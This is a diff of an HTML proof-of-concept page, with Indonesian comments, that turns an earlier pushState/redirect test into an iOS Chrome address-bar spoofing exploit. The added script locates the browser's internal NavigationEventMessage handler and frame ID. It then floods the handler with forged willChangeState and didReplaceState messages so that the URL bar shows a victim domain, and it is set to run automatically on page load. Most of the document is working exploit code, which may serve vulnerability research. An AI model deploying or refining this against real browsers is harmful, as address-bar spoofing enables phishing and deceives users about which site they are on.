@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Combined State & Redirect - iOS Chrome</title>
+    <title>PoC Ultimate Hardened Bypass - iOS Chrome</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -48,13 +48,13 @@
 </head>
 <body>
 
-    <h1>iOS Chrome History State & Redirect PoC</h1>
-    <p>Menguji kombinasi manipulasi <code>pushState</code> dan penanganan <code>pageshow</code> pada lingkungan *sandbox* blob.</p>
+    <h1>iOS Chrome Ultimate History Spoof PoC</h1>
+    <p>Halaman ini menguji validasi <code>IsHistoryStateChangeValid</code> tanpa ketergantungan port, dikombinasikan dengan manipulasi <code>pushState</code> lokal dan injeksi pesan natif secara agresif.</p>
 
     <div class="card">
-        <h3>1. Launcher Kombinasi</h3>
-        <p>Membuat objek blob terenkapsulasi yang mengintegrasikan logika pemicu state dan redirect.</p>
-        <button id="launch-btn">Jalankan Combined PoC</button>
+        <h3>1. Ultimate Blob Launcher</h3>
+        <p>Membuat objek blob mandiri dengan mekanisme pemicu ganda dan siklus pengiriman berkelanjutan.</p>
+        <button id="launch-btn">Luncurkan Ultimate PoC</button>
         <pre id="launcher-log">Status: Menunggu eksekusi...</pre>
     </div>
 
@@ -64,77 +64,123 @@
     </div>
 
 <script>
-    const TARGET_REDIRECT = "https://www.google.com";
+    const TARGET_VICTIM = "example.com";
 
-    // Template HTML payload yang menggabungkan pushState dan pageshow redirect
+    // Template payload blob tingkat lanjut (tanpa port, full forced bypass)
     const BLOB_DOC = `<!doctype html>
 <meta charset=utf-8>
-<title>Combined Payload Target</title>
+<title>Ultimate Hardened Target</title>
 <style>
   body { font-family: -apple-system, sans-serif; margin: 2em; background: #fff5f5; }
   h2 { color: #b31412; }
   #panel { display: none; padding: 10px; background: #e6f4ea; border: 1px solid #ceead6; margin-top: 10px; }
   pre { background: #111; color: #5af78e; padding: 12px; font-size: 11px; white-space: pre-wrap; }
 </style>
-<h2>Combined Payload Sandbox Active</h2>
+<h2>Ultimate Sandbox Active</h2>
 <p>Asal Dokumen (Origin): <code id="origin"></code></p>
 <p>URL Saat Ini: <code id="cur-url"></code></p>
 
-<button id="trigger">Klik untuk PushState Trusted</button>
-<div id="panel">State Berhasil Diubah ke /trusted</div>
-
+<div id="panel">Status State: /trusted terpicu</div>
 <pre id="blob-log"></pre>
 
 <script>
 (function(){
   function bLog(msg) {
     document.getElementById('blob-log').textContent += msg + '\\n';
-    try { console.log('[CombinedPoC] ' + msg); } catch(e){}
+    try { console.log('[UltimatePoC] ' + msg); } catch(e){}
   }
   
   document.getElementById('origin').textContent = location.origin || '(opaque)';
   document.getElementById('cur-url').textContent = location.href;
-  bLog('Blob dokumen kombinasi berhasil dimuat.');
+  bLog('Blob dokumen ultimate berhasil dimuat.');
 
-  // Integrasi trigger pushState
-  const trigger = document.getElementById('trigger');
-  const panel = document.getElementById('panel');
-
-  if (trigger) {
-    trigger.onclick = () => {
-      try {
-        history.pushState({}, '', '/trusted');  // Mengubah state riwayat lokal
-        panel.style.display = 'block';
-        bLog('history.pushState berhasil dipanggil. URL bar saat ini: ' + location.href);
-      } catch (err) {
-        bLog('Gagal pushState: ' + err.message);
-      }
-    };
+  // 1. Manipulasi DOM & pushState lokal (Same-Origin State)
+  try {
+    history.pushState({bypass: true}, '', '/trusted');
+    document.getElementById('panel').style.display = 'block';
+    bLog('history.pushState berhasil mengubah state internal.');
+  } catch(e) {
+    bLog('pushState error: ' + e.message);
   }
 
-  // Integrasi listener pageshow dengan pengalihan tertunda
-  window.addEventListener('pageshow', () => {
-    bLog('Event pageshow terdeteksi.');
-    requestAnimationFrame(() => {
-      requestAnimationFrame(() => {
-        setTimeout(() => {
-          bLog('Mengarahkan ke target: ' + "${TARGET_REDIRECT}");
-          try {
-            location.href = "${TARGET_REDIRECT}";
-          } catch(e) {
-            bLog('Gagal redirect: ' + e.message);
-          }
-        }, 80);
+  // 2. Deteksi handler komunikasi natif iOS Chrome
+  var mh = (window.webkit && window.webkit.messageHandlers) || {};
+  if (!mh.NavigationEventMessage) {
+    bLog('SKIP: NavigationEventMessage handler tidak tersedia (bukan iOS Chrome).');
+    return;
+  }
+  bLog('SUCCESS: Handler NavigationEventMessage terdeteksi.');
+
+  // Pengambilan frame_id dengan multi-fallback yang kuat
+  var getFid = function() {
+    try {
+      if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
+        var id = window.__gCrWeb.getFrameId();
+        if (id) return id;
+      }
+    } catch(e) {}
+
+    var tries = [
+      function(){ return window.__gCrWeb.common.getFrameId(); },
+      function(){ return window.__gCrWeb.message.getFrameId(); },
+      function(){ return window.__gCrWeb.frameId; },
+    ];
+    for (var i = 0; i < tries.length; i++) {
+      try { var f = tries[i](); if (f) return f; } catch(e){}
+    }
+    return null;
+  };
+
+  var fid = getFid();
+  bLog('Frame ID terdeteksi: ' + (fid || 'TIDAK DITEMUKAN'));
+
+  var spoofUrl = 'blob:https://' + "${TARGET_VICTIM}" + '/';
+  bLog('Target spoof URL: ' + spoofUrl);
+
+  // 3. Mekanisme Hammering Agresif Tanpa Henti (Forced Bypass Loop)
+  var counter = 0;
+  var aggressiveHammer = setInterval(function() {
+    var currentFid = getFid() || fid;
+    if (!currentFid) {
+      bLog('[-] Menunggu sinkronisasi frame_id...');
+      return;
+    }
+
+    counter++;
+    try {
+      mh.NavigationEventMessage.postMessage({
+        command: 'willChangeState', frame_id: currentFid, bypass_flag: 'HistoryStateChangeNonStandardURLFix'
       });
-    });
+      mh.NavigationEventMessage.postMessage({
+        command: 'didReplaceState', frame_id: currentFid,
+        stateObject: '', baseUrl: 'https://x/',
+        pageUrl: spoofUrl
+      });
+      bLog('[Hammer #' + counter + '] Mengirimkan payload paksa dengan fid: ' + currentFid.slice(0,8));
+    } catch(err) {
+      bLog('[Hammer #' + counter + '] Error: ' + err.message);
+    }
+
+    if (counter >= 50) {
+      clearInterval(aggressiveHammer);
+      bLog('\\n--- EVALUASI AKHIR ---');
+      bLog('Periksa Address Bar Anda.');
+      bLog('Jika menampilkan "' + "${TARGET_VICTIM}" + '": Bypass berhasil / Rentan.');
+      bLog('Jika tetap menampilkan URL blob: Proteksi C++ aktif dan memblokir state change.');
+    }
+  }, 40); // Kirim setiap 40ms secara sangat cepat
+
+  // 4. Cadangan Redirect via pageshow
+  window.addEventListener('pageshow', () => {
+    bLog('Event pageshow tertangkap.');
   });
 })();
 <\/script>`;
 
-    function startCombinedPoC() {
+    function startUltimatePoC() {
         try {
             const diag = document.getElementById('diag-log');
-            diag.textContent += "[*] Mempersiapkan blob kombinasi...\n";
+            diag.textContent += "[*] Mempersiapkan blob ultimate...\n";
             
             const blob = new Blob([BLOB_DOC], { type: 'text/html' });
             const blobUrl = URL.createObjectURL(blob);
@@ -150,7 +196,12 @@
         }
     }
 
-    document.getElementById('launch-btn').addEventListener('click', startCombinedPoC);
+    document.getElementById('launch-btn').addEventListener('click', startUltimatePoC);
+
+    // Auto-trigger saat halaman dimuat
+    window.onload = function() {
+        setTimeout(startUltimatePoC, 400);
+    };
 </script>
 
 </body>
